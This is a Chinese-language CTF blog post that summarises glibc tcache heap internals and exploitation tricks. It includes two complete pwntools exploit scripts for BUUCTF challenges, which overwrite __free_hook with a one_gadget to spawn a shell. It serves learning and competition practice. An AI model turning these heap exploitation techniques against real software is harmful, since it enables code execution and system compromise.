@@ -1,0 +1,631 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="清風微醺" href="https://www.wdqjxtmph.top/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="清風微醺" href="https://www.wdqjxtmph.top/atom.xml" />
+<link rel="alternate" type="application/json" title="清風微醺" href="https://www.wdqjxtmph.top/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="pwn技巧" />
+
+
+<link rel="canonical" href="https://www.wdqjxtmph.top/2022/03/13/Tcache%20bin%E6%80%BB%E7%BB%93/">
+
+
+
+  <title>
+Tcachebin 总结 - CTF |
+Nirvana = 清風微醺 = 凌恒</title>
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">Tcachebin 总结
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2022-03-13 15:07:13">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2022-03-13T15:07:13+08:00">2022-03-13</time>
+  </span>
+  <span class="item" title="本文字数">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">本文字数</span>
+    <span>5k</span>
+    <span class="text">字</span>
+  </span>
+  <span class="item" title="阅读时长">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">阅读时长</span>
+    <span>5 分钟</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Nirvana</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipewr8iypj20zk0m8b29.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipetlbztpj20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipesx5fdwj20zk0m81kx.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipeun65urj20zk0m81ii.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gicitht3xtj20zk0m8k5v.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclwrdwyaj20zk0m8are.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTF/" itemprop="item" rel="index" title="分类于 CTF"><span itemprop="name">CTF</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="https://www.wdqjxtmph.top/2022/03/13/Tcache%20bin%E6%80%BB%E7%BB%93/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="invincible">
+    <meta itemprop="description" content="凌恒, 凌恒山其若陋兮、">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="清風微醺">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="tcache"><a class="markdownIt-Anchor" href="#tcache">#</a> Tcache</h1>
+<p>Tcache 是 glibc 2.26 之后引入的机制，与 glibc 2.23 版本下堆利用方式有一定区别，产生了新的利用方式。</p>
+<hr>
+<h1 id="0x1-相关结构体"><a class="markdownIt-Anchor" href="#0x1-相关结构体">#</a> 0x1 相关结构体</h1>
+<h3 id="tcache_entry"><a class="markdownIt-Anchor" href="#tcache_entry">#</a> tcache_entry</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>
+<p><code>tcache_entry</code>  用来链接空闲的 tcache chunk，其中的 <code>next</code>  指针指向下一个大小相同的空闲 tcache chunk。</p>
+<p>注意：<strong>这里的 next 指针指向的是 user data 部分，也就是说指向的是 chunk head+0x10 地址处</strong></p>
+<p><strong>而 fastbin 则指向的是 chunk head</strong></p>
+<hr>
+<h3 id="tcache_perthread_struct"><a class="markdownIt-Anchor" href="#tcache_perthread_struct">#</a> tcache_perthread_struct</h3>
+<p><code>tcache_perthread_struct</code>  是 tcache 的管理结构，他：</p>
+<ul>
+<li>收藏了所有的 <code>tcache_entry</code></li>
+<li>记录了空闲 tcache 个数，也就是 <code>tcache_entry</code>  的个数</li>
+</ul>
+<p>这个管理结构会在第一次调用 malloc 时，先 malloc 一块内存用来存放 <code>tcache_perthread_struct</code> 。因此做 glibc &gt;=2.26 的题时，gdb 调试的时候第一个堆块即为 <code>tcache_perthread_struct</code> 。</p>
+<hr>
+<h1 id="0x2-基本知识点"><a class="markdownIt-Anchor" href="#0x2-基本知识点">#</a> 0x2 基本知识点</h1>
+<ul>
+<li>free 的堆块，当内存小于 small bin size 时 (0x400)，会被优先置入 tcache bin 链表，当填满七个后，才会填入 fastbin/unsortedbin 链表</li>
+<li>malloc 时，优先从 tcache bin 中寻找是否有合适大小的 bin。</li>
+</ul>
+<h1 id="0x3-常见利用方式"><a class="markdownIt-Anchor" href="#0x3-常见利用方式">#</a> 0x3 常见利用方式</h1>
+<p>有</p>
+<p><code>tcache poisoning</code></p>
+<p><code>tcache dup</code></p>
+<p><code>tcache perthread corruption</code></p>
+<p><code>tcache house of spirit</code></p>
+<p><code>tcache stashing unlink attack</code></p>
+<p>等。</p>
+<p>具体利用方式，不再赘述。可以去 CTF-wiki 上看看。</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi90Y2FjaGUtYXR0YWNrLw==">CTF-wiki-tcache</span></p>
+<hr>
+<h1 id="0x4-个人总结"><a class="markdownIt-Anchor" href="#0x4-个人总结">#</a> 0x4 个人总结</h1>
+<p>学习完 CTF-wiki 上对于 tcache bin 的利用方式后，我个人在做题中也遇到一些林林总总的问题，也 get 到了一些知识点。</p>
+<h2 id="41-tcache-double-free机制绕过"><a class="markdownIt-Anchor" href="#41-tcache-double-free机制绕过">#</a> 4.1 tcache double free 机制绕过</h2>
+<h3 id="411补充知识点"><a class="markdownIt-Anchor" href="#411补充知识点">#</a> 4.1.1 补充知识点</h3>
+<p>tcache 为空时，如果  <code>fastbin/smallbin/unsorted bin</code>  中有 size 符合的 chunk，会先把  <code>fastbin/smallbin/unsorted bin</code>  中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取。</p>
+<hr>
+<h3 id="绕过方式"><a class="markdownIt-Anchor" href="#绕过方式">#</a> 绕过方式</h3>
+<p>在 glibc 较低版本下，我们可以直接利用 <code>tcache dup</code> ，free 掉一个相同的 tcache 堆块两次。比 fastbin double free 要好用得多。</p>
+<p>经过我 patchelf 之后发现， <code>libc2.27-3ubuntu1</code>  及之前均可直接使用 <code>tcache dup</code> ，当版本大于等于 <code>libc2.27-3ubuntu1_</code> 后不可直接 double free。</p>
+<p>原因是加入了对 tcache bin double free 的检测，至于检测的源代码我就不贴了，感兴趣的可以上 CTF-wiki 上看。</p>
+<p>讲讲绕过的办法：</p>
+<p><strong>可以通过 fastbin double free 触发 stash，构造 tcache 任意地址写</strong></p>
+<p>具体流程：</p>
+<ul>
+<li>先 free 掉多个相同大小堆块 (size &lt;=0x80)，填满 tcache bin 链表</li>
+<li>继续 free 掉相同大小的堆块，进入 fastbin，构造 <code>fastbin double free</code></li>
+<li>将 tcache bin 链表中的 chunk 全部 malloc 回来</li>
+<li>再 malloc 一次，即可触发 stash，构造任意地址写</li>
+</ul>
+<p>步骤一二之后，我们的空闲堆块链表结构应该是这样的：(画的有点丑)</p>
+<p><img data-src="https://tvax2.sinaimg.cn/large/008qDYGVly1h08efqx1vdj30jg0m8taj.jpg" alt="2"></p>
+<p>然后经过步骤三之后，tcache 链表清空，再 malloc 时，会从先从 tcache bin 链表中寻找，发现并没有合适大小的堆块，然后到 fastbin 链表中找到合适大小的堆块，将 fastbin 链表中的所有堆块放进 tcache 中：</p>
+<p><img data-src="https://tvax1.sinaimg.cn/large/008qDYGVly1h08ekyc1t4j30jg0m8my0.jpg" alt="2"></p>
+<p>然后取走 p1，malloc 时伪造 fastbin p1 的 fd 指针，可以达到任意地址写的目的：</p>
+<p><img data-src="https://tva4.sinaimg.cn/large/008qDYGVly1h08em1j1ogj30jg0m83zb.jpg" alt=""></p>
+<h2 id="42-tcache-bin-的一些特性"><a class="markdownIt-Anchor" href="#42-tcache-bin-的一些特性">#</a> 4.2 tcache bin 的一些特性</h2>
+<h3 id="特性一"><a class="markdownIt-Anchor" href="#特性一">#</a> 特性一</h3>
+<p>calloc 时不会去 tcache bin 中寻找。</p>
+<h4 id="例题-gyctf_2020_signin"><a class="markdownIt-Anchor" href="#例题-gyctf_2020_signin">#</a> 例题 gyctf_2020_signin</h4>
+<p>这道题主要利用了两个知识点：</p>
+<ul>
+<li>在分配 fastbin 中的 chunk 时若还有其他相同大小的 fastbin_chunk 则把它们全部放入 tcache 中。(前面补充的知识点)</li>
+<li>calloc 不会分配 tcache 空闲链表中的堆块。</li>
+</ul>
+<p>直接贴我的 exp 了，有兴趣的可以去 BUU 上做做：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># r = process(&#x27;/mnt/hgfs/ubuntu/BUUCTF/gyctf_2020_signin&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28190</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;your choice?&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;your choice?&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;your choice?&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;your choice?&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ptr_addr = <span class="number">0x4040c0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    new(i)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(j)</span><br><span class="line">new(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(ptr_addr-<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">shell()</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="特性二"><a class="markdownIt-Anchor" href="#特性二">#</a> 特性二</h3>
+<p>tcache 中的 chunk 不会合并</p>
+<p>Ptmalloc2 中，为了整理内存碎片，通常会进行 unlink 操作，但在 tcache 中，chunk 之间不会合并。</p>
+<h4 id="例题-hitcon_2018_children_tcache"><a class="markdownIt-Anchor" href="#例题-hitcon_2018_children_tcache">#</a> 例题 hitcon_2018_children_tcache</h4>
+<p>做这道题之前我还不知道 tcache 之中的 chunk 不会合并，于是将堆结构 构造成这样之后：</p>
+<p><img data-src="https://tvax4.sinaimg.cn/large/008qDYGVly1h08f23ltlwj30fu033gou.jpg" alt="1"></p>
+<p>我就很纳闷为什么 free 掉 chunk2 不会触发 unlink 合并 chunk1。</p>
+<p>后来查资料知道了 tcache 中的 chunk 不会合并。</p>
+<p>那就只好合并两个 unsorted bin 了。</p>
+<p>这道题有几个注意事项：</p>
+<ul>
+<li>注意 free 之后 malloc 回来的堆块的 index，容易搞错。</li>
+<li>有 OFF BY NULL 漏洞，但是因为 free 堆块时会用 memset 干扰，所以只能多次利用 OFF BY NULL 将 pre_size 写对。</li>
+<li>主要使用夹心饼攻击，用两个 unsorted bin 夹一个较小的 chunk，构造 chunk overlapping</li>
+</ul>
+<p>我的 exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># r = process(&#x27;/mnt/hgfs/ubuntu/BUUCTF/HITCON_2018_children_tcache&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27042</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/mnt/hgfs/ubuntu/BUUCTF/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Your choice: &quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Data:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Your choice: &quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Your choice: &quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x410</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">new(<span class="number">0x28</span>,<span class="string">b&#x27;b&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">new(<span class="number">0x4f0</span>,<span class="string">b&#x27;c&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">b&#x27;d&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):  </span><br><span class="line">    new(<span class="number">0x28</span>-i,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>-i))</span><br><span class="line">    delete(<span class="number">0</span>)<span class="comment">#trick</span></span><br><span class="line">new(<span class="number">0x22</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;\x50\x04&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">0x410</span>,<span class="string">b&#x27;e&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))-libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]-<span class="number">0x10</span>-<span class="number">96</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">new(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#0#2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">free_hook = libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]+libc_base</span><br><span class="line">new(<span class="number">0x20</span>,p64(free_hook))</span><br><span class="line">new(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">one_gadget = libc_base+<span class="number">0x4f322</span></span><br><span class="line">new(<span class="number">0x20</span>,p64(one_gadget))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="43-打tcache_perthread_struct结构体"><a class="markdownIt-Anchor" href="#43-打tcache_perthread_struct结构体">#</a> 4.3 打 tcache_perthread_struct 结构体</h2>
+<p><code>tcache_perthread_struct</code>  结构体里有着</p>
+<p>①Tcache 的 next 指针</p>
+<p>②空闲堆块数。</p>
+<p>控制该结构体即可:</p>
+<ul>
+<li>malloc 到任意地址</li>
+<li>改变空闲堆块数，free 可得到 unsortedbin</li>
+</ul>
+<h2 id="44-tcache-bin-下标"><a class="markdownIt-Anchor" href="#44-tcache-bin-下标">#</a> 4.4 tcache bin 下标</h2>
+<p>具体可参照 glibc 源码，是将 Tcache bin 下标看作无符号整数的。</p>
+<p>因此我们可以构造出 circle list 后，add 三次，此时 tcache bin 下标变为负数。</p>
+<p><img data-src="https://tva1.sinaimg.cn/large/008qDYGVly1h0fapzfj6jj308801e0su.jpg" alt="DN11U(IOUKUZ2K{Q4}UAJ~T"></p>
+<p>此时由于下标是无符号整数，转换过来会得到一个很大的数，自然大于 7，因此此时再 free 堆块即可进入 unsortedbin 范围。</p>
+
+      <div class="tags">
+          <a href="/tags/pwn%E6%8A%80%E5%B7%A7/" rel="tag"><i class="ic i-tag"></i> pwn技巧</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2022-04-06 21:41:51" itemprop="dateModified" datetime="2022-04-06T21:41:51+08:00">2022-04-06</time>
+  </span>
+  <span id="2022/03/13/Tcache bin总结/" class="item leancloud_visitors" data-flag-title="Tcachebin 总结" title="阅读次数">
+      <span class="icon">
+        <i class="ic i-eye"></i>
+      </span>
+      <span class="text">阅读次数</span>
+      <span class="leancloud-visitors-count"></span>
+      <span class="text">次</span>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="invincible 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="invincible 支付宝">
+        <p>支付宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>invincible <i class="ic i-at"><em>@</em></i>清風微醺
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="https://www.wdqjxtmph.top/2022/03/13/Tcache%20bin%E6%80%BB%E7%BB%93/" title="Tcachebin 总结">https://www.wdqjxtmph.top/2022/03/13/Tcache bin总结/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2022/02/02/%E5%88%A9%E7%94%A8realloc%E8%B0%83%E6%95%B4%E6%A0%88%E4%BD%BFone_gadget%E7%94%9F%E6%95%88/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipexoj0moj20zk0m8kgu.jpg" title="利用realloc调整栈使one_gadget生效">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> CTF</span>
+  <h3>利用realloc调整栈使one_gadget生效</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#tcache"><span class="toc-number">1.</span> <span class="toc-text"> Tcache</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x1-%E7%9B%B8%E5%85%B3%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">2.</span> <span class="toc-text"> 0x1 相关结构体</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache_entry"><span class="toc-number">2.0.1.</span> <span class="toc-text"> tcache_entry</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache_perthread_struct"><span class="toc-number">2.0.2.</span> <span class="toc-text"> tcache_perthread_struct</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x2-%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">3.</span> <span class="toc-text"> 0x2 基本知识点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">4.</span> <span class="toc-text"> 0x3 常见利用方式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x4-%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text"> 0x4 个人总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#41-tcache-double-free%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">5.1.</span> <span class="toc-text"> 4.1 tcache double free 机制绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#411%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">5.1.1.</span> <span class="toc-text"> 4.1.1 补充知识点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">5.1.2.</span> <span class="toc-text"> 绕过方式</span></a></li></ol></li><li 